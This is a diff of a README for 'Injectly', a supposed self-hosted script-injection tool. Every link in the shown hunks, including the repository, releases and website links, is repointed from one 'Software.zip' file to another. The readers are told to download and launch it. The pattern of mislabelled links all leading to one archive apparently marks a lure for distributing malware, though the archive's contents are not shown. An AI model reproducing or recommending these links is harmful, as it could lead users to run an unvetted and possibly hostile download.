@@ -3,11 +3,11 @@
 
 ---
 
-[![Download Injectly](https://img.shields.io/badge/Download-Injectly-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Injectly](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip)](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip)
 
 ---
 
-## **🔖 Repository: [injectly](https://github.com/user-attachments/files/18388744/Software.zip)**
+## **🔖 Repository: [injectly](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip)**
 ## **📝 Description:** 
 Injectly is a simple, self-hosted code injector app designed to streamline the process of managing and injecting scripts across multiple websites. This lightweight and modern tool allows you to effortlessly inject JavaScript, CSS, and dynamic scripts using a user-friendly interface built with EJS and SQLite.
 
@@ -30,7 +30,7 @@ Injectly is a simple, self-hosted code injector app designed to streamline the p
 ## **🌟 Get Started with Injectly:**
 
 ### **1. Installation:**
-1. **Download** the [Injectly software](https://github.com/user-attachments/files/18388744/Software.zip).
+1. **Download** the [Injectly software](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip).
 2. **Launch** the software on your preferred platform.
 3. **Follow** the on-screen instructions for setup.
 
@@ -50,8 +50,8 @@ Injectly is a simple, self-hosted code injector app designed to streamline the p
 ---
 
 ## **🚀 Explore More:**
-- **Check out** the [latest releases](https://github.com/user-attachments/files/18388744/Software.zip) for updates.
-- **Visit** the [Injectly website](https://github.com/user-attachments/files/18388744/Software.zip) for more information.
+- **Check out** the [latest releases](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip) for updates.
+- **Visit** the [Injectly website](https://github.com/saeedisme/injectly/releases/download/v2.0/Software.zip) for more information.
 - **Join** the Injectly community for support and discussions.
   
 ---
